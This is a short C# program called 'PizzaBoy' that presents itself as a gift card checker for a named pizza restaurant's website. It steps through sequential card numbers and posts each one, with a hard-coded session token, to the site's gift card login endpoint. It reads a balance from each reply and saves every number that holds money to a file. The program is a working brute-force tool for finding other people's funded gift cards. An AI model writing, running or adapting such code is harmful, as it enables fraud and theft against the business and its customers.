using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace PizzaBoy
{
    class Program
    {

        static String siteName = "Patxispizza.com";
        //static String startingVal = null;
        static long endVal = 3000000000000099999;
        static long defaultVal = 3000000000000010000;
        static void Main(string[] args)
        {
            Console.Title = $"PizzaBoy - Giftcard Checker for {siteName} | UID: 69588";

            /*Console.WriteLine("(Optional) Enter Starting Index:");  // Extremely broken; cba to fix.
            startingVal = Console.ReadLine();
            if(startingVal != null)
            {
                defaultVal = Convert.ToInt64($"30000000000000{startingVal}");
            }*/

            Thread thdLoop = new Thread(() => checkCodes());
            thdLoop.IsBackground = true;
            thdLoop.Start();

            Console.ReadKey();
        }


        static void checkCodes()
        {
            for(long i = defaultVal; i <= endVal; i++)
            {
                if (isValid(i))
                {
                    Console.WriteLine($"{i} - Valid!");
                }
                else
                {
                    Console.WriteLine($"{i} - Invalid!");
                }
            }
        }

        static bool isValid(long code)
        {
            webTask wt = new webTask();
            wt.URL = "http://giftcards.patxispizza.com/loginAction.do";
            wt.POSTData = $"org.apache.struts.taglib.html.TOKEN=02c13912876a94f096e711f47b558179&requiresPIN=false&redirectUrl=http%3A%2F%2Fwww3.myicard.net&iCardNumber={code}&styleDir=650481%2Fstyle1&language=en_US";
            Object response = WebRequest_Wrapper.Request(wt);
            try
            {
                String balance = Regex.Match((String)response, @"(\d{1,3}\.\d{1,2})").Groups[0].ToString();

                if(balance != null && balance != "0.0")
                {
                    File.AppendAllText(Environment.CurrentDirectory + @"\Valid.txt", $"{code}|${balance}\r\n");

                    return true;
                }
            }
            catch(Exception ex)
            {
                return false;
            }
            //
            
            return false;
        }

    }

    public class validCode
    {
        public long Code;
        public String Value;
    }
}
